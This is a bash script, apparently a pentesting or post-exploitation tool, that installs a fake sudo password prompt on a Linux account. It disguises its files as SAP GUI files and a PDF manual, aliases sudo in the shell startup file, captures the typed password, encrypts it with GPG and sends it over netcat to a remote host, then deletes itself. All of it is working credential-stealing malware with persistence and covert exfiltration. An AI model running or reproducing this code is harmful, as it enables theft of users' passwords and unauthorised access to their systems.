#####################################################################
# Checks of parameters and more stuff
#####################################################################
target_host=$1
port_http_server=6666
port_nc_server=6667
if [ -z $target_host ]
then
    echo "[-] Missing target host!!"
    echo "[-] Exiting..."
    exit 1
fi
if ! (which nc 2>1 > /dev/null && which gpg 2>1 > /dev/null)
then 
    echo "[-] Missing NC or GPG"
    echo "[-] Exiting..."
    exit 1
fi
if ! (ping $target_host -c 1 -w 2 2>1 > /dev/null)
then   
    echo "[-] Missing connection to target host: $target_host"
    echo "[-] Exiting..."
    exit 1
fi
#####################################################################


#####################################################################
# Path and files configurations
#####################################################################
# Create directory for all these data
scriptfolder=$HOME/.SAPGUI7.40
scriptpath="$scriptfolder/.sapgui_start.sh"
keypath="$scriptfolder/.sapgui_manual.pdf"
echo "[+] Creating folder for storing files in $scriptfolder"
mkdir -p $scriptfolder
# Download and store key
echo "[+] Downloading key from host: $target_host, port $port to $keypath"
wget http://$target_host:$port_http_server/pentesting_issues.pdf 2>1 > /dev/null
mv pentesting_issues.pdf $keypath
echo "[+] Adding public key to keyring" 
gpg --import $keypath 2>1 > /dev/null
#####################################################################

#####################################################################
# Getting information required
#####################################################################
# Get the shell
if [ ! -z $BASH ] ;
    then
    shellrc="$HOME/.bashrc"
    shell="bash"
else
    shellrc="$HOME/.zshrc"
    shell="zsh"
fi
# Get the interpreter for the shell
interpreter=$(which $shell)
echo "[+] Shell found!: $shell"
echo "[+] Interpreter to be used: $interpreter"
#####################################################################


#####################################################################
# Script creation
#####################################################################
echo "[+] Creating script in $scriptpath"
echo "#!$interpreter" > $scriptpath
# If the password was already gathered, don't do nothing
echo "if [[ \$hk_status == \"DONE\" ]];" >> $scriptpath
echo "then touch /dev/null" >> $scriptpath
# If there is connection to the target host chosen
echo "elif ping $target_host -c 1 -w 2 2>1 > /dev/null && ls $keypath 2>1 > /dev/null " >> $scriptpath
echo "then" >> $scriptpath
# Prompt the message for asking the password
echo "echo -n \"[sudo] password for $USER: \"" >> $scriptpath   
# Store the password 
echo "read -s password" >> $scriptpath
# Send the encrypted password to the system
echo "echo \$USER:\$password | gpg -a -e -r labanda@dellechuga.com --trust-model=always | nc -q 0 $target_host $port_nc_server" >> $scriptpath 
# For the moment we are not going to delete the public 
#echo "gpg --delete-key labanda@dellechuga.com" >> $scriptpath
# Prompt some more messages to simulate that the real sudo
#  binary is executing 
echo "echo" >> $scriptpath
echo "sleep 2" >> $scriptpath
echo "echo \"Sorry, try again.\" " >> $scriptpath
echo "echo \"\" >> $shellrc " >> $scriptpath
# Set the status variable to DONE
echo "hk_status=\"DONE\"" >> $scriptpath
# Recover the original shellrc file
echo "cp $shellrc.org $shellrc"  >> $scriptpath
# Remove the script folder
echo "else" >> $scriptpath
# If there the password wasn't sent yet, but there is no
# connection to the server, just don't execute and 
# wait for another time.
echo "touch /dev/null" >> $scriptpath
echo "fi"  >> $scriptpath
#####################################################################


#####################################################################
# Creating backup and giving rights to the script to execute
#####################################################################
echo "[+] Giving rights of execution to script"
chmod 755 $scriptpath
echo "[+] Copying original $shellrc"
cp $shellrc $shellrc.org
#####################################################################


#####################################################################
# Writing in the shellrc (sudo alias) and status variable
#####################################################################
echo "[+] Modifying $shellrc with alias and more.."
echo "" >> $shellrc
# the way the alias of sudo is definied (the way it executes the scriptapath) is 
# on purpose in order to use the same variables in the terminal 
# after the script is executed
echo "alias sudo=\". $scriptpath; /usr/bin/sudo \$@\"" >> $shellrc
echo "hk_status=\"YES\"" >> $shellrc
echo "export hk_status" >> $shellrc
#####################################################################

echo "[+] All job is done! Deleting this file"

# Bye ;)
rm 1
rm $0
